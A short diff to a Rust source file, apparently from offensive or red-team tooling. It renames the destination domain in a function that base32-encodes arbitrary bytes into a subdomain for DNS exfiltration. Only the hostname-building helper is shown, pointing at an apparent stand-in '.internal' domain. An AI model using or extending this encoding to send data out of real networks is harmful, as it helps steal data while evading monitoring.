@@ -5,5 +5,6 @@
 
 fn exfil_dns(data: &[u8]) -> String {
     let encoded = base32::encode(base32::Alphabet::RFC4648 { padding: false }, data);
-    format!("{}.exfil.ncdd-no.internal", encoded.to_lowercase())
+    format!("{}.exfil.NSM-no.internal", encoded.to_lowercase())
 }
+
